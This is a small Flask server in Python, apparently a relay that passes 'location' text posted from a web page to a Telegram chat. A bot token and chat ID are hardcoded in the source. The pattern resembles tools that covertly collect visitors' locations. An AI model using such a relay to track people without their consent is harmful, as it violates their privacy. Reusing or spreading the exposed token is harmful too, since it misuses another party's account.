from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

# إعدادات البوت
BOT_TOKEN = '8332410324:AAEai9n4ojPBRHD6QT92IvQAhuiYzfXeMR4'
CHAT_ID = '7744463904'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-location', methods=['POST'])
def send_location():
    data = request.json
    text = data.get('text')
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    resp = requests.post(url, json={'chat_id': CHAT_ID, 'text': text})
    return jsonify(resp.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
